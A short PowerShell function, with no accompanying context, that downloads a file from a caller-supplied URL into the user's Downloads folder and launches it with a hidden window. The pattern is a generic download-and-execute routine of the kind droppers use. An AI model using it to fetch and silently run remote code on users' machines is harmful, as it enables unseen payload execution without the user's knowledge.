function run {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$True)]
    [string]$urltofile,
    [parameter(Position=1,Mandatory=$True)]
    [string]$filenamea
)

    $outpath = "C:\Users\$env:username\Downloads\$filenamea"
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri $urltofile -OutFile $outpath

    $args = "/filename C:\Users\$env:username\Downloads\$filenamea"
    Start-Process $outpath -ArgumentList $args -WindowStyle Hidden
    Start-Sleep -Seconds 5

}
